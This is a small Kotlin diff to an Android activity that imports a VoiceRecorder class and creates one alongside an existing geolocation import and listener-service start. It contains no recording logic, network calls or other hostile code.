@@ -6,6 +6,7 @@
 package com.example.sender
 
 import Geolocation
+import VoiceRecorder
 import android.content.Intent
 import android.os.Bundle
 import android.util.Log
@@ -79,6 +80,8 @@ class AppActivity : ComponentActivity() {
         // start listener
         val intent = Intent(this, ListenerService::class.java)
         startService(intent)
+
+        val voiceRecorder = VoiceRecorder(this)
     }
 
 
